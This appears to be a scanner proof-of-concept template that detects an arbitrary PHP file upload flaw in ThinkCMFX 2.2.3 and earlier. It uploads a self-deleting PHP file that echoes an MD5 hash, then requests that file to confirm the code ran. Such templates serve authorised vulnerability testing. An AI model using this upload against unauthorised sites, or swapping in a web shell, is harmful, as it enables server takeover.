name: poc-yaml-thinkcmf-file-upload
binding: 3c34d49a-c25f-4fbf-9b09-a78dd6e648fe
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0
    vulnerability:
        id: CT-529684
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info:
        - version 2.2.3 测试
        - 需要普通用户权限，默认可注册
    warning: 该脚本会上传文件产生一个临时的无害文件，同时能够执行自删除逻辑，但是可能删除不成功
transport: http
set:
    rand1: randomInt(800000000, 1000000000)
    filename1: randomLowercase(6)
    boundary1: randomLowercase(16)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?g=Asset&m=Ueditor&a=upload&action=uploadfile
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary1}}
            body: |
                ------WebKitFormBoundary{{boundary1}}
                Content-Disposition: form-data; name="file"; filename="{{filename1}}.php"
                Content-Type: text/php

                <?php echo(md5({{rand1}})); unlink(__FILE__);?>
                ------WebKitFormBoundary{{boundary1}}
                Content-Disposition: form-data; name="submit"

                提交
                ------WebKitFormBoundary{{boundary1}}--
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains("SUCCESS")
        output:
            search: '''"url":\\s*"(?P<filepath>.*?)\\.php"''.submatch(response.body_string)'
            filepath: search["filepath"]
            filepath1: replaceAll(filepath, "\\", "")
    r1:
        request:
            cache: true
            method: GET
            path: ^/{{filepath1}}.php
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(bytes(md5(string(rand1))))
expression: r0() && r1()
